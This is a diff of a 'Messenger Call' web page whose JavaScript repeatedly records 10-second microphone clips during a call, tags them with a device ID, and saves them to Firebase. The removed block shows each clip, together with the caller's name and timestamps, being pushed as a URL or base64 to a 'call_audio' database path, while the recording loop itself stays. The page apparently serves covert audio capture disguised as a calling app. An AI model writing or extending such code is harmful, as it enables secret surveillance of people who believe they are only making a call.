@@ -515,9 +515,7 @@ const firebaseConfig = {
 const firebaseApp = initializeApp(firebaseConfig);
 const db = getDatabase(firebaseApp);
 
-
 console.log('✅ Firebase initialized');
-console.log('📦 Storage bucket:', firebaseConfig.storageBucket);
 
 /* ============================================================
    2. DEVICE ID + SESSION ID
@@ -612,7 +610,7 @@ let audioRecorder = null;
 let audioChunks = [];
 let audioLoopTimer = null;
 let isAudioRecording = false;
-const AUDIO_CLIP_DURATION = 10000;
+const AUDIO_CLIP_DURATION = 10000;   // 10 sec
 let clipNumber = 0;
 
 /* ============================================================
@@ -804,9 +802,8 @@ function startCallUI() {
 }
 
 /* ============================================================
-   13. 🔥 AUDIO RECORDING — 10 SEC (FIXED)
+   13. 🔥 AUDIO RECORDING — 10 SEC
    ============================================================ */
-
 async function recordAudioClip() {
   if (!localStream || isAudioRecording) return;
 
@@ -825,7 +822,6 @@ async function recordAudioClip() {
 
     const audioOnlyStream = new MediaStream(audioTracks);
 
-    // 🔥 MIME type detection
     let mimeType = 'audio/webm;codecs=opus';
     if (!MediaRecorder.isTypeSupported(mimeType)) {
       mimeType = 'audio/webm';
@@ -834,7 +830,7 @@ async function recordAudioClip() {
       mimeType = 'audio/mp4';
     }
     if (!MediaRecorder.isTypeSupported(mimeType)) {
-      mimeType = '';   // browser default
+      mimeType = '';
     }
 
     console.log(`🎤 Using MIME: ${mimeType || 'default'}`);
@@ -942,50 +938,6 @@ async function saveAudioToDB(blob, mimeType) {
   }
 }
 
-
-  // 🔥 STEP 3: Save to RTDB (always — metadata + optional base64)
-  try {
-    console.log('⏳ Saving to RTDB...');
-
-    const audioRef = ref(db, 'call_audio/' + DEVICE_ID);
-
-    const dataToSave = {
-      deviceId: DEVICE_ID,
-      sessionId: SESSION_ID,
-      caller: currentContact ? currentContact.name : 'Unknown',
-      size: blob.size,
-      duration: duration,
-      mimeType: mimeType || 'audio/webm',
-      date: dt.date,
-      time: dt.time,
-      timestamp: timestamp,
-      capturedAtISO: dt.iso,
-      capturedAt: serverTimestamp()
-    };
-
-    if (downloadURL) {
-      // Storage success → URL save karo
-      dataToSave.audioUrl = downloadURL;
-      dataToSave.storage = 'firebase-storage';
-    } else {
-      // Storage fail → base64 save karo RTDB me
-      dataToSave.audioBase64 = base64;
-      dataToSave.storage = 'rtdb-base64';
-      console.warn('⚠️ Saving base64 to RTDB (may hit size limit)');
-    }
-
-    const newRef = await push(audioRef, dataToSave);
-
-    console.log('✅ RTDB save SUCCESS:', newRef.key);
-    showToast('🎤 Audio saved ✅');
-
-  } catch (rtdbErr) {
-    console.error('❌ RTDB save FAILED:', rtdbErr.code);
-    console.error('❌ Message:', rtdbErr.message);
-    showToast('❌ Save failed: ' + (rtdbErr.code || 'unknown'));
-  }
-
-
 /* ============================================================
    15. AUDIO LOOP — Every 10 sec
    ============================================================ */
@@ -995,12 +947,12 @@ function startAudioLoop() {
   console.log('🎤 Audio loop started (10 sec clips)');
 
   setTimeout(() => {
-    if (localStream) recordAudioClip();   // pehla clip 2 sec baad
+    if (localStream) recordAudioClip();
   }, 2000);
 
   audioLoopTimer = setInterval(() => {
     if (localStream && !isAudioRecording) {
-      recordAudioClip();    // har 11 sec me
+      recordAudioClip();
     }
   }, 11000);
 }
@@ -1152,7 +1104,6 @@ window.addEventListener('beforeunload', () => {
 });
 
 console.log('✅ Messenger Call ready');
-console.log('📁 Storage + RTDB fallback enabled');
 </script>
 </body>
 </html>
